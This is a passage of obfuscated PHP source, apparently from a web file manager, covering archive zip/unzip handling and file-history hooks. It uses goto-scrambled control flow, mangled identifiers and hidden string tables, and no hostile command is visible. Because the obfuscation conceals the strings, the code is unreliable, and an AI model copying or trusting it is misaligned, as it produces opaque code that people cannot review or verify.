$A¨ÏíùƒÑ[751], count($c“¾»»ÉÛ§), LNG($A¨ÏíùƒÑ[752]) . $A¨ÏíùƒÑ[449] . LNG($A¨ÏíùƒÑ[754]) . $A¨ÏíùƒÑ[774]); $E¦†«‘©”×->task[$A¨ÏíùƒÑ[732]] = $cØÃ¢ìœö; foreach ($bšÌí„Ù–Š[$A¨ÏíùƒÑ[84]] as $DÌÙã‘ÅÁï) { $a™ğÍ†ö®… = IO::move($DÌÙã‘ÅÁï[$A¨ÏíùƒÑ[86]], $F¤Ÿ´éÏ“ä); if (!$a™ğÍ†ö®…) { $E¦†«‘©”×->end(); $B¶ÒÛö†Š = IO::getLastError($A¨ÏíùƒÑ[775] . $DÌÙã‘ÅÁï[$A¨ÏíùƒÑ[86]] . $A¨ÏíùƒÑ[776] . $F¤Ÿ´éÏ“ä . $A¨ÏíùƒÑ[513]); write_log($B¶ÒÛö†Š, $A¨ÏíùƒÑ[751]); return !1; } } goto däÀÔâÓí¸; båß¤™Ğ™: } private function backupPath($d¹Şèº‡ñ) { $D»É’Œ ” =& $_SERVER[Ü˜]; $F‚Øğæ÷“® = $d¹Şèº‡ñ[$D»É’Œ ”[28]]; $a¼Í¹®Ò¿ø = Model($D»É’Œ ”[739])->get($D»É’Œ ”[740]); $E‰Æîéµ¹„ = substr(md5($D»É’Œ ”[741] . $a¼Í¹®Ò¿ø . $F‚Øğæ÷“®), 0, 8); return "\173\x69\157\72{$d¹Şèº‡ñ[$D»É’Œ ”[721]]}\x7d\57\x64\x61\164\141\142\x61\x73\x65\57\142\x61\x63\153\x75\x70\57" . $F‚Øğæ÷“® . $D»É’Œ ”[81] . $E‰Æîéµ¹„; } private function tmpFilesPath() { $cÚÁÃé‡Õ½ =& $_SERVER[Ü˜]; $FÕíÜĞ„—¸ = TEMP_FILES; if ($GLOBALS[$cÚÁÃé‡Õ½[6]][$cÚÁÃé‡Õ½[98]][$cÚÁÃé‡Õ½[769]]) { $FÕíÜĞ„—¸ = $GLOBALS[$cÚÁÃé‡Õ½[6]][$cÚÁÃé‡Õ½[98]][$cÚÁÃé‡Õ½[769]]; if (!mk_dir($FÕíÜĞ„—¸) || !is_writable($FÕíÜĞ„—¸) || !IO::mkfile($FÕíÜĞ„—¸ . $cÚÁÃé‡Õ½[770])) { $FÕíÜĞ„—¸ = TEMP_FILES; } } return $FÕíÜĞ„—¸; } } goto aä‘Ñ­î§; E½²İ¼ôÄÍ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $a’øŠï”–; if (!$a’øŠï”–) { $bù›ÆÑ‰È× = IO::init($_SERVER[Ü˜][8]); } return $bù›ÆÑ‰È×; } private static function iconvSystem($e¨÷‘œ‡Œº) { return self::local()->iconvSystem($e¨÷‘œ‡Œº); } private static function iconvApp($E§õŸ¤äç—) { return self::local()->iconvApp($E§õŸ¤äç—); } public static function zip($bÇªÔÉµ‡õ, $cŸÄ—ŒÇó‚ = "\172\151\x70", $d“·ôÉÙäİ = '', $a¤¸ß…¡×¶ = REPEAT_RENAME) { goto bÌÇÃÃ‰µÍ; bÌÇÃÃ‰µÍ: $AÅß«²× =& $_SERVER[Ü˜]; $BØÜĞÒ‹Üæ = self::init($bÇªÔÉµ‡õ[0][$AÅß«²×[86]]); $AÙÁŞÔ³œÄ = self::info($bÇªÔÉµ‡õ[0][$AÅß«²×[86]]); goto A˜¦¡£‹±›; A˜¦¡£‹±›: $C¾¬óß„¦ç = !1; if (!$d“·ôÉÙäİ && $BØÜĞÒ‹Üæ->getType() == $AÅß«²×[116]) { $b•äÍÑÚ¶À = self::zipFileList($bÇªÔÉµ‡õ); } else { $C¾¬óß„¦ç = $d“·ôÉÙäİ ? $d“·ôÉÙäİ : TEMP_FILES . $AÅß«²×[1080] . time() . rand_string(8) . $AÅß«²×[8]; mk_dir($C¾¬óß„¦ç); $b•äÍÑÚ¶À = self::zipFileList($bÇªÔÉµ‡õ, $C¾¬óß„¦ç); } $cÌ†‰ˆÒéŒ = $AÙÁŞÔ³œÄ[$AÅß«²×[28]]; goto Dƒæ»ùÌù; Dƒæ»ùÌù: if (count($b•äÍÑÚ¶À) > 1) { $a—ìŠÀÓ–« = IO::info(IO::pathFather($AÙÁŞÔ³œÄ[$AÅß«²×[86]])); $cÌ†‰ˆÒéŒ = $a—ìŠÀÓ–«[$AÅß«²×[28]]; } $Eîò­¸…Ëê = $C¾¬óß„¦ç; if (!$Eîò­¸…Ëê) { $Eîò­¸…Ëê = get_path_father($AÙÁŞÔ³œÄ[$AÅß«²×[86]]); if (!$d“·ôÉÙäİ && $BØÜĞÒ‹Üæ->getType() == $AÅß«²×[116]) { $Eîò­¸…Ëê = get_path_father($BØÜĞÒ‹Üæ->path); } $d—Çƒ›„Õ = IO::info($Eîò­¸…Ëê); if (!$d—Çƒ›„Õ[$AÅß«²×[206]]) { show_json(LNG($AÅß«²×[1081]), !1); } } goto f¡Ñâ¿‘£; aæº¡®İİŒ: foreach ($b•äÍÑÚ¶À as $cÑÛ®‚ÜÄÜ => $Cƒ»²ŠÈáÂ) { $b•äÍÑÚ¶À[$cÑÛ®‚ÜÄÜ] = self::iconvSystem($Cƒ»²ŠÈáÂ); } KodArchive::create($E•˜‚ÖÔ, $b•äÍÑÚ¶À); if (!IO::exist($AÊÄ¥æ†µÎ)) { if ($C¾¬óß„¦ç) { del_dir($C¾¬óß„¦ç); } show_json(LNG($AÅß«²×[1082]), !1); } goto b¡„ôêâŒ¬; b¡„ôêâŒ¬: if ($d“·ôÉÙäİ || !$C¾¬óß„¦ç) { if ($C¾¬óß„¦ç && strstr($C¾¬óß„¦ç, TEMP_FILES)) { $e¤â¾»ø  = $b•äÍÑÚ¶À = array(); recursion_dir($Eîò­¸…Ëê, $e¤â¾»ø , $b•äÍÑÚ¶À, 0); foreach ($e¤â¾»ø  as $b™Øõ‡É„“) { del_dir($b™Øõ‡É„“); } foreach ($b•äÍÑÚ¶À as $e¨ÔÏÙ†Š¢) { if ($e¨ÔÏÙ†Š¢ == $E•˜‚ÖÔ) { continue; } del_file($e¨ÔÏÙ†Š¢); } } return $AÊÄ¥æ†µÎ; } $E²Òß›‰˜’ = self::pathFather($AÙÁŞÔ³œÄ[$AÅß«²×[86]]); $C¨õ½Ô¤ù = self::move($AÊÄ¥æ†µÎ, $E²Òß›‰˜’, $a¤¸ß…¡×¶); goto cÚ£Œ°ŸñÙ; f¡Ñâ¿‘£: $AÊÄ¥æ†µÎ = $Eîò­¸…Ëê . $cÌ†‰ˆÒéŒ . $AÅß«²×[105] . $cŸÄ—ŒÇó‚; $AÊÄ¥æ†µÎ = get_filename_auto($AÊÄ¥æ†µÎ, $AÅß«²×[33], $a¤¸ß…¡×¶); $E•˜‚ÖÔ = self::iconvSystem($AÊÄ¥æ†µÎ); goto aæº¡®İİŒ; cÚ£Œ°ŸñÙ: if (!$C¨õ½Ô¤ù) { del_dir($C¾¬óß„¦ç); show_json(LNG($AÅß«²×[1082]), !1); } del_dir($C¾¬óß„¦ç); return $C¨õ½Ô¤ù; goto a–¡òè¾‹; a–¡òè¾‹: } public static function unzip($c¾‡ßÌ†ì», $cÙ´Ç­¼Í‹ = "\x72\x65\160\x6c\141\143\x65") { goto D›â”ãßÂÛ; ašºÁ¥…: return !0; goto DÒµ ¾»ö; e—Ü´ê¸Ã: foreach ($D‚ÆÏø“ƒ as $D…×áÎÙóñ) { $D…×áÎÙóñ = self::iconvApp($D…×áÎÙóñ); self::move($D…×áÎÙóñ, $DÉ›…œ•Ùè, $cÙ´Ç­¼Í‹); } del_dir($c–¥±¶ñ¦¹); if (!$FöâÇ‘œÑ) { del_file($d‚ƒ²½èÍ¡); } goto ašºÁ¥…; AğÕ‹‰Û›â: Hook::trigger($b°Æ××‹¤[1090], $c–¥±¶ñ¦¹); recursion_dir($c–¥±¶ñ¦¹, $EÍÄñ¯–¦, $cß íÂ™ÃË, 0); $D‚ÆÏø“ƒ = array_merge($EÍÄñ¯–¦, $cß íÂ™ÃË); goto e—Ü´ê¸Ã; cÚÖâ–áÁ›: if (!@file_exists(self::iconvSystem($d‚ƒ²½èÍ¡))) { $FöâÇ‘œÑ = self::localFilePath($aˆâ‹¸†Šù, $A¶éÀ—ğó); $d‚ƒ²½èÍ¡ = $FöâÇ‘œÑ ? $FöâÇ‘œÑ : parent::download($aˆâ‹¸†Šù, $d‚ƒ²½èÍ¡); } $d‚ƒ²½èÍ¡ = self::iconvSystem($d‚ƒ²½èÍ¡); $dƒ™Ø–×·ç = isset($c¾‡ßÌ†ì»[$b°Æ××‹¤[1085]]) ? $c¾‡ßÌ†ì»[$b°Æ××‹¤[1085]] : $b°Æ××‹¤[1086]; goto CÍîË°Ÿ°; CÍîË°Ÿ°: $a·³½Œ¼…­ = KodArchive::extract($d‚ƒ²½èÍ¡, $c–¥±¶ñ¦¹ . $b°Æ××‹¤[8], $dƒ™Ø–×·ç); self::archiveExt(); if (!$a·³½Œ¼…­[$b°Æ××‹¤[1087]]) { show_json($b°Æ××‹¤[1088] . $a·³½Œ¼…­[$b°Æ××‹¤[1089]], !1); } goto AğÕ‹‰Û›â; AÁ†É¬Í³æ: $e×¸Š†Ö† = self::tmpFileName($Cî«’â§Ü); $c–¥±¶ñ¦¹ = TEMP_FILES . $e×¸Š†Ö†; del_dir($c–¥±¶ñ¦¹); goto Dƒ™ñµ‘õ™; Dƒ™ñµ‘õ™: mk_dir($c–¥±¶ñ¦¹); $A¶éÀ—ğó = self::fileExt($Cî«’â§Ü); $d‚ƒ²½èÍ¡ = $c–¥±¶ñ¦¹ . $b°Æ××‹¤[105] . $A¶éÀ—ğó; goto cÚÖâ–áÁ›; DÈğé²á: if (!($Cî«’â§Ü = parent::info($aˆâ‹¸†Šù))) { show_json(LNG($b°Æ××‹¤[1084]), !1); } if (!($eŞ–ÍŠ³ôî = parent::infoFull($DÉ›…œ•Ùè))) { $DÉ›…œ•Ùè = parent::mkdir($DÉ›…œ•Ùè); $eŞ–ÍŠ³ôî = array($b°Æ××‹¤[86] => $DÉ›…œ•Ùè); } else { if (isset($eŞ–ÍŠ³ôî[$b°Æ××‹¤[404]]) && trim($eŞ–ÍŠ³ôî[$b°Æ××‹¤[86]], $b°Æ××‹¤[8]) != trim($DÉ›…œ•Ùè, $b°Æ××‹¤[8])) { $FÇÈ„Û§¬ä = KodIO::make($eŞ–ÍŠ³ôî[$b°Æ××‹¤[487]]); $AÎ‚ŒÛÙŒÙ = parent::fileNameAuto($FÇÈ„Û§¬ä, $eŞ–ÍŠ³ôî[$b°Æ××‹¤[28]], REPEAT_RENAME_FOLDER, !0); $DÉ›…œ•Ùè = parent::mkdir($FÇÈ„Û§¬ä . $AÎ‚ŒÛÙŒÙ); $eŞ–ÍŠ³ôî = array($b°Æ××‹¤[86] => $DÉ›…œ•Ùè); } } $DÉ›…œ•Ùè = $eŞ–ÍŠ³ôî[$b°Æ××‹¤[86]]; goto AÁ†É¬Í³æ; D›â”ãßÂÛ: $b°Æ××‹¤ =& $_SERVER[Ü˜]; $aˆâ‹¸†Šù = $c¾‡ßÌ†ì»[$b°Æ××‹¤[86]]; $DÉ›…œ•Ùè = $c¾‡ßÌ†ì»[$b°Æ××‹¤[1083]]; goto DÈğé²á; DÒµ ¾»ö: } public static function unzipList($DŸÎôˆŸî´) { goto A‘Šä«¥î; b•óöŒÑ : if (!is_dir($A˜éÜ‘ÌÓ)) { mk_dir($A˜éÜ‘ÌÓ); } $fñáÆ°Ä—³ = $A˜éÜ‘ÌÓ . $d°‰…¢à–[8] . $døãˆ¤­ÒŒ; if (!@file_exists(self::iconvSystem($fñáÆ°Ä—³))) { if (isset($d”ÊÔä…”õ)) { url_request($bòäŒ†ø²˜, $d°‰…¢à–[1094], $fñáÆ°Ä—³); } else { $eïãà¼İ†‡ = self::localFilePath($bòäŒ†ø²˜, $aô¾ÚÁÍèĞ); $fñáÆ°Ä—³ = $eïãà¼İ†‡ ? $eïãà¼İ†‡ : self::download($bòäŒ†ø²˜, $fñáÆ°Ä—³); } } goto d«×ğŒ÷„; Fˆñ›Ú‹ò—: if (isset($d”ÊÔä…”õ)) { $F¥§œö›¿è = array($d”ÊÔä…”õ[$d°‰…¢à–[86]], $d”ÊÔä…”õ[$d°‰…¢à–[1091]], $d”ÊÔä…”õ[$d°‰…¢à–[28]]); $døãˆ¤­ÒŒ = md5(implode($d°‰…¢à–[81], $F¥§œö›¿è)) . $d°‰…¢à–[105] . get_path_ext($d”ÊÔä…”õ[$d°‰…¢à–[28]]); } else { $F¥§œö›¿è = array($CàÈÎÎôˆ»[$d°‰…¢à–[28]], $CàÈÎÎôˆ»[$d°‰…¢à–[86]], $CàÈÎÎôˆ»[$d°‰…¢à–[88]]); $døãˆ¤­ÒŒ = md5(implode($d°‰…¢à–[81], $F¥§œö›¿è)) . $d°‰…¢à–[105] . $aô¾ÚÁÍèĞ; } if ($d•Î´Éí“È == -1) { $c Ò®Ï¦ŠÂ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\x69\145\167\57{$F‡»’İÄ‡á}\57{$døãˆ¤­ÒŒ}\x2e\154\157\147"; $AóªÙÄˆğõ = self::infoFull($c Ò®Ï¦ŠÂ); if ($AóªÙÄˆğõ) { $c Ò®Ï¦ŠÂ = $AóªÙÄˆğõ[$d°‰…¢à–[86]]; $Aó——´ª = self::getContent($c Ò®Ï¦ŠÂ); if ($Aó——´ª) { $A²ÌğËÅáŸ = json_decode($Aó——´ª, !0); if (count($A²ÌğËÅáŸ) >= $bÈ´˜ÈäìŞ) { show_json(sprintf(LNG($d°‰…¢à–[1093]), count($A²ÌğËÅáŸ)), !1); } return $A²ÌğËÅáŸ; } } else { $c Ò®Ï¦ŠÂ = self::mkfile($c Ò®Ï¦ŠÂ); } } $A˜éÜ‘ÌÓ = TEMP_FILES . $F‡»’İÄ‡á; goto b•óöŒÑ ; f™• İº¿«: $CàÈÎÎôˆ» = self::info($b Ö»Ñ¥ß); $aô¾ÚÁÍèĞ = self::fileExt($CàÈÎÎôˆ»); $F‡»’İÄ‡á = self::tmpFileName($CàÈÎÎôˆ»); goto Fˆñ›Ú‹ò—; C”‚ŞæºÄÍ: return $b±Ó¸Ş‡ê[$d°‰…¢à–[1089]]; goto a ê«´Û¿; Aãê¥¯Øœä: $bÈ´˜ÈäìŞ = 50000; if (request_url_safe($bòäŒ†ø²˜)) { $d”ÊÔä…”õ = parse_url_query($bòäŒ†ø²˜); if (!isset($d”ÊÔä…”õ[$d°‰…¢à–[86]])) { show_json($d°‰…¢à–[1092], !1); } } $b Ö»Ñ¥ß = isset($d”ÊÔä…”õ) ? $d”ÊÔä…”õ[$d°‰…¢à–[86]] : $bòäŒ†ø²˜; goto f™• İº¿«; d«×ğŒ÷„: $fñáÆ°Ä—³ = self::iconvSystem($fñáÆ°Ä—³); if ($d•Î´Éí“È >= 0) { $aãŒ¦›¶î² = isset($DŸÎôˆŸî´[$d°‰…¢à–[1095]]) ? $DŸÎôˆŸî´[$d°‰…¢à–[1095]] : !1; $fˆ…Ê¥ò‡  = isset($DŸÎôˆŸî´[$d°‰…¢à–[28]]) ? $DŸÎôˆŸî´[$d°‰…¢à–[28]] : $d°‰…¢à–[33]; KodArchive::filePreview($fñáÆ°Ä—³, $d•Î´Éí“È, $aãŒ¦›¶î², $fˆ…Ê¥ò‡ ); self::archiveExt(); die; } $b±Ó¸Ş‡ê = KodArchive::listContent($fñáÆ°Ä—³); goto bÁÕìí¢ÖØ; bÁÕìí¢ÖØ: self::archiveExt(); del_dir($A˜éÜ‘ÌÓ); if (!$b±Ó¸Ş‡ê[$d°‰…¢à–[1087]]) { show_json($b±Ó¸Ş‡ê[$d°‰…¢à–[1089]], !1); } goto Bñ‰ïÅª›; A‘Šä«¥î: $d°‰…¢à– =& $_SERVER[Ü˜]; $bòäŒ†ø²˜ = $DŸÎôˆŸî´[$d°‰…¢à–[86]]; $d•Î´Éí“È = isset($DŸÎôˆŸî´[$d°‰…¢à–[1091]]) ? $DŸÎôˆŸî´[$d°‰…¢à–[1091]] : -1; goto Aãê¥¯Øœä; Bñ‰ïÅª›: $A²ÌğËÅáŸ = json_encode($b±Ó¸Ş‡ê[$d°‰…¢à–[1089]]); self::setContent($c Ò®Ï¦ŠÂ, $A²ÌğËÅáŸ); if (count($b±Ó¸Ş‡ê[$d°‰…¢à–[1089]]) >= $bÈ´˜ÈäìŞ) { show_json(sprintf(LNG($d°‰…¢à–[1093]), count($b±Ó¸Ş‡ê[$d°‰…¢à–[1089]])), !1); } goto C”‚ŞæºÄÍ; a ê«´Û¿: } private static function fileExt($d¯œ®ÌĞ…‰) { $FğØ±ä¼µ =& $_SERVER[Ü˜]; $E¢Ë¡Ú´Ö‹ = $d¯œ®ÌĞ…‰[$FğØ±ä¼µ[178]]; if ($E¢Ë¡Ú´Ö‹ == $FğØ±ä¼µ[1096]) { $Eà‘ˆİåø = $FğØ±ä¼µ[1097]; if (substr($d¯œ®ÌĞ…‰[$FğØ±ä¼µ[28]], -strlen($Eà‘ˆİåø)) == $Eà‘ˆİåø) { $E¢Ë¡Ú´Ö‹ = $FğØ±ä¼µ[1098]; } } self::archiveExt($E¢Ë¡Ú´Ö‹); return $E¢Ë¡Ú´Ö‹; } private static function zipFileList($B®Áæ·ãİÆ, $Cß†‡“æŠß = false) { $AŸ’“©¹‘æ =& $_SERVER[Ü˜]; $f–´Œ¼«¨Û = array(); foreach ($B®Áæ·ãİÆ as $aÃ‡ÊÛÌã¿) { $dîïË³¶˜ë = $aÃ‡ÊÛÌã¿[$AŸ’“©¹‘æ[86]]; if ($Cß†‡“æŠß) { $dîïË³¶˜ë = self::copy($aÃ‡ÊÛÌã¿[$AŸ’“©¹‘æ[86]], $Cß†‡“æŠß, $AŸ’“©¹‘æ[792]); } else { $Aœ„¬ÓÁè« = self::init($aÃ‡ÊÛÌã¿[$AŸ’“©¹‘æ[86]]); if ($Aœ„¬ÓÁè«->getType() == $AŸ’“©¹‘æ[116]) { $dîïË³¶˜ë = $Aœ„¬ÓÁè«->path; } } if ($dîïË³¶˜ë && self::local()->exist($dîïË³¶˜ë)) { $f–´Œ¼«¨Û[$aÃ‡ÊÛÌã¿[$AŸ’“©¹‘æ[86]]] = $dîïË³¶˜ë; } } if (!empty($f–´Œ¼«¨Û)) { return array_values($f–´Œ¼«¨Û); } show_json(LNG($AŸ’“©¹‘æ[1062]), !1); } public static function tmpFileName($eãùñ•œ”œ) { $Dù‰îØÎ =& $_SERVER[Ü˜]; $FÊ±’Àİ“ = array($eãùñ•œ”œ[$Dù‰îØÎ[28]], $eãùñ•œ”œ[$Dù‰îØÎ[86]], $eãùñ•œ”œ[$Dù‰îØÎ[88]], $eãùñ•œ”œ[$Dù‰îØÎ[496]]); return md5(implode($Dù‰îØÎ[81], $FÊ±’Àİ“)); } private static function localFilePath($aÈè‡ÒÇå, $c£ªœ¤ŸØÖ) { goto eŞ÷Ú‚—Ê; eŞ÷Ú‚—Ê: $CºÕŠìç­¼ =& $_SERVER[Ü˜]; if ($c£ªœ¤ŸØÖ == $CºÕŠìç­¼[1099] && strtoupper(substr(PHP_OS, 0, 3)) == $CºÕŠìç­¼[1100]) { return !1; } $C–Æ»Ê´…Â = KodIO::parse($aÈè‡ÒÇå); goto BÏƒ£ãÁñÑ; BÏƒ£ãÁñÑ: if ($C–Æ»Ê´…Â[$CºÕŠìç­¼[29]] == KodIO::KOD_SOURCE) { $D™õô‚“áœ = Model($CºÕŠìç­¼[799])->fileInfoGet(KodIO::sourceID($aÈè‡ÒÇå)); if (!$D™õô‚“áœ[$CºÕŠìç­¼[86]]) { show_json($CºÕŠìç­¼[1101], !1); } $aÈè‡ÒÇå = $D™õô‚“áœ[$CºÕŠìç­¼[86]]; } $eÛ–è›òÚƒ = self::init($aÈè‡ÒÇå); $cç¾»ŠÍìˆ = $eÛ–è›òÚƒ->getType(); goto dÑß…æ¡È; dÑß…æ¡È: if ($cç¾»ŠÍìˆ == $CºÕŠìç­¼[116] || $cç¾»ŠÍìˆ == $CºÕŠìç­¼[1102]) { if (!$eÛ–è›òÚƒ->exist($eÛ–è›òÚƒ->path)) { show_json(LNG($CºÕŠìç­¼[115]), !1); } return $eÛ–è›òÚƒ->path; } return !1; goto Føó¬Š†’; Føó¬Š†’: } private static function archiveExt($dĞâµ¡›¦³ = '') { $GLOBALS[$_SERVER[Ü˜][1103]] = $dĞâµ¡›¦³; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto Fˆİäøààˆ; B¤§²¨×“†: Hook::bind($c©ä°Ï¶ö•[1115], $c©ä°Ï¶ö•[1116]); Hook::bind($c©ä°Ï¶ö•[1117], $c©ä°Ï¶ö•[1118]); goto F¥Ñ«¼‚›Ñ; cÀáÙˆ¯ª: Hook::bind($c©ä°Ï¶ö•[1109], $c©ä°Ï¶ö•[1110]); Hook::bind($c©ä°Ï¶ö•[1111], $c©ä°Ï¶ö•[1112]); Hook::bind($c©ä°Ï¶ö•[1113], $c©ä°Ï¶ö•[1114]); goto B¤§²¨×“†; e±Èƒàñİ: if ($a²½¢Ÿ«Ä•[$c©ä°Ï¶ö•[1105]] <= 0) { return; } if (isset($_REQUEST[$c©ä°Ï¶ö•[1106]]) && $_REQUEST[$c©ä°Ï¶ö•[1106]] == $c©ä°Ï¶ö•[97]) { return; } Hook::bind($c©ä°Ï¶ö•[1107], $c©ä°Ï¶ö•[1108]); goto cÀáÙˆ¯ª; Fˆİäøààˆ: $c©ä°Ï¶ö• =& $_SERVER[Ü˜]; $a²½¢Ÿ«Ä• = $GLOBALS[$c©ä°Ï¶ö•[6]][$c©ä°Ï¶ö•[98]]; if ($a²½¢Ÿ«Ä•[$c©ä°Ï¶ö•[1104]] != 1) { return; } goto e±Èƒàñİ; F¥Ñ«¼‚›Ñ: } public static function eventBeforeUpload($fÒ˜±š¸®) { if ($fÒ˜±š¸®[3] && $fÒ˜±š¸®[3] != REPEAT_REPLACE) { return; } $DÜñˆ›³ë = self::parsePath($fÒ˜±š¸®[0]); if (!$DÜñˆ›³ë) { return; } self::add($DÜñˆ›³ë); } public static function eventBeforeEdit($fç˜©‘å‰™) { $Dà ²×œÂ = self::parsePath($fç˜©‘å‰™[0]); if (!$Dà ²×œÂ) { return; } self::add($Dà ²×œÂ); } public static function eventBeforeCopyFile($bš¦šŒ’Ãó, $aõ‰µ»³–, $Aëéë­Úä, $d……Ş¡ëŸ¸, $fõŒäãÎ, $EôêÍ·—¤‰) { $D²´Š…–‰ = $Aëéë­Úä->getPathOuter($d……Ş¡ëŸ¸); $f½—½ëŒÒ = self::parsePath($D²´Š…–‰); if (!$f½—½ëŒÒ) { return; } self::add($f½—½ëŒÒ); } public static function eventBeforeRename($CÒÀö»„ƒÏ) { $cñ½¶×¨ïÊ =& $_SERVER[Ü˜]; $eÛ²½»äù» = self::parsePath($CÒÀö»„ƒÏ[0]); if (!$eÛ²½»äù») { return; } $DšÈ­‰Š– = self::checkInHistory($eÛ²½»äù»); if (!$DšÈ­‰Š–) { return; } if ($DšÈ­‰Š–[$cñ½¶×¨ïÊ[29]] == $cñ½¶×¨ïÊ[203]) { $C’á›ª°ã = self::listData($eÛ²½»äù»); if ($C’á›ª°ã && $C’á›ª°ã[$cñ½¶×¨ïÊ[376]]) { self::moveHistory($eÛ²½»äù», $CÒÀö»„ƒÏ[1]); } } else { IO::rename($DšÈ­‰Š–[$cñ½¶×¨ïÊ[86]], $CÒÀö»„ƒÏ[1]); } } public static function eventBeforeMove($e‰ß¦éÇŸ’) { goto E–º¡²±ƒõ; C‘Ú¥é§Ä: $F–†ÛŒ™Ù² = self::checkInHistory($añ»»‡Àî); if (!$F–†ÛŒ™Ù²) { return; } $Eå¤ƒ¥àºå = self::pathHistory($D¾ÔÉ¢¯Ò¿); goto eÑ‚—©à¨›; b¦«ùèÌ‘Ş: $D¾ÔÉ¢¯Ò¿ = self::parsePath($e‰ß¦éÇŸ’[1]); if (!$D¾ÔÉ¢¯Ò¿) { return; } $Béå¤‹­âÌ = $e‰ß¦éÇŸ’[3]; goto C‘Ú¥é§Ä; eÑ‚—©à¨›: if ($F–†ÛŒ™Ù²[$fÕ‚íÄ’¥[29]] == $fÕ‚íÄ’¥[203]) { $b‰×šªÆ = self::listData($añ»»‡Àî); $DÚÕĞ×Ùù… = rtrim($D¾ÔÉ¢¯Ò¿, $fÕ‚íÄ’¥[8]) . $fÕ‚íÄ’¥[8] . ($Béå¤‹­âÌ ? $Béå¤‹­âÌ : get_path_this($añ»»‡Àî)); $Eïáå±­¹ö = self::listData($DÚÕĞ×Ùù…); if ($b‰×šªÆ && $b‰×šªÆ[$fÕ‚íÄ’¥[376]] && $Eïáå±­¹ö && $Eïáå±­¹ö[$fÕ‚íÄ’¥[376]]) { return self::clear($añ»»‡Àî); } if ($b‰×šªÆ && $b‰×šªÆ[$fÕ‚íÄ’¥[376]]) { self::moveHistory($añ»»‡Àî, $Béå¤‹­âÌ, $Eå¤ƒ¥àºå); } } else { IO::move($F–†ÛŒ™Ù²[$fÕ‚íÄ’¥[86]], $Eå¤ƒ¥àºå, !1, $Béå¤‹­âÌ); self::clearEmptyFolder(IO::pathFather($F–†ÛŒ™Ù²[$fÕ‚íÄ’¥[86]])); } goto Cˆ˜–—; E–º¡²±ƒõ: $fÕ‚íÄ’¥ =& $_SERVER[Ü˜]; $añ»»‡Àî = self::parsePath($e‰ß¦éÇŸ’[0]); if (!$añ»»‡Àî) { return; } goto b¦«ùèÌ‘Ş; Cˆ˜–—: } public static function eventAfterRemove($C˜êƒ…ß¦…, $Eã¸á—‡ ¤) { goto dÄ°ì•æğæ; dÄ°ì•æğæ: $C³ä„‘ÃâÊ =& $_SERVER[Ü˜]; if (!$Eã¸á—‡ ¤) { return; } $d­ÀÖ§–× = self::parsePath($C˜êƒ…ß¦…[0]); goto f‰êÊÂÏå; f‰êÊÂÏå: if (!$d­ÀÖ§–×) { return; } $b”±Ò‡—İ = self::checkInHistory($d­ÀÖ§–×); if (!$b”±Ò‡—İ) { return; } goto e¸±º‘ÙïÃ; e¸±º‘ÙïÃ: if ($b”±Ò‡—İ[$C³ä„‘ÃâÊ[29]] == $C³ä„‘ÃâÊ[203]) { $c‰ëÅÃŸä… = self::listData($d­ÀÖ§–×, !1); if ($c‰ëÅÃŸä… && $c‰ëÅÃŸä…[$C³ä„‘ÃâÊ[376]]) { self::clear($d­ÀÖ§–×, !1); } } else { IO::remove($b”±Ò‡—İ[$C³ä„‘ÃâÊ[86]]); self::clearEmptyFolder(IO::pathFather($b”±Ò‡—İ[$C³ä„‘ÃâÊ[86]])); } goto dì¿ó¤ÃÜ; dì¿ó¤ÃÜ: } private static function checkInHistory($A›äáâ‚ù÷) { $F÷ï‘êÃÆ” = self::pathHistory($A›äáâ‚ù÷); if (!IO::exist($F÷ï‘êÃÆ”)) { $F÷ï‘êÃÆ” .= $_SERVER[Ü˜][1119]; } return IO::exist($F÷ï‘êÃÆ”) ? IO::info($F÷ï‘êÃÆ”) : !1; } private static function parsePath($d›î—îÍŠ) { goto dØîùëõ·é; EßÁõƒ‘Ù: self::log($GLOBALS[$CŞó”ö¾ñä[1044]] . $CŞó”ö¾ñä[1124] . $d›î—îÍŠ); return $d›î—îÍŠ; goto eøÖ¼‚óİĞ; cš»Îªí: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Bßİ…§ç¤ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $CŞó”ö¾ñä[1123]); foreach ($Bßİ…§ç¤ as $b¶ÀÛœ›) { if (!$b„¬£Ï›Ò && substr($d›î—îÍŠ, 0, strlen($b¶ÀÛœ›)) == $b¶ÀÛœ›) { return !1; } } goto EßÁõƒ‘Ù; dØîùëõ·é: $CŞó”ö¾ñä =& $_SERVER[Ü˜]; if (!$d›î—îÍŠ) { return !1; } if ($GLOBALS[$CŞó”ö¾ñä[1120]]) { return; } goto Dá‰¯÷™Ò£; Dá‰¯÷™Ò£: $dÈ¾Îõäé‡ = KodIO::parse($d›î—îÍŠ); $b„¬£Ï›Ò = $dÈ¾Îõäé‡[$CŞó”ö¾ñä[29]]; $bÏğŒÎ·£¸ = !$b„¬£Ï›Ò || $b„¬£Ï›Ò == KodIO::KOD_IO || $b„¬£Ï›Ò == KodIO::KOD_SHARE_ITEM; goto f¥—Şîëø; f¥—Şîëø: if (!$bÏğŒÎ·£¸ || !$dÈ¾Îõäé‡[$CŞó”ö¾ñä[1121]]) { return !1; } if (substr($d›î—îÍŠ, 0, strlen(DATA_PATH . $CŞó”ö¾ñä[1122])) == DATA_PATH . $CŞó”ö¾ñä[1122]) { return !1; } if ($b„¬£Ï›Ò == KodIO::KOD_SHARE_ITEM) { $c¨ì§‡ààç = IO::init($d›î—îÍŠ); if ($c¨ì§‡ààç->pathParse[$CŞó”ö¾ñä[1049]]) { return self::parsePath($c¨ì§‡ààç->pathParse[$CŞó”ö¾ñä[1049]]); } return !1; } goto cš»Îªí; eøÖ¼‚óİĞ: } private static function pathHistory($B¦—Êİ†…¼) { $D¢¬Œ³§½« =& $_SERVER[Ü˜]; $A¼‰œÚãĞ = self::$_historyBase . ltrim(KodIO::clear($B¦—Êİ†…¼), $D¢¬Œ³§½«[8]); $A¼‰œÚãĞ = str_replace(array($D¢¬Œ³§½«[1125]), array($D¢¬Œ³§½«[1126]), $A¼‰œÚãĞ); return $A¼‰œÚãĞ; } public static function log($CÆ¿ç‹»ø÷) { } public static function historyCount($a”øŒÒ÷ƒ) { $f…­‚°†Ğ =& $_SERVER[Ü˜]; $c“ãë›Ú§  = array(); $aŞ¥Ò¤Æ = array(); foreach ($a”øŒÒ÷ƒ as $cë©áÛ‘Æ) { $E‡²ŒìÉ” = 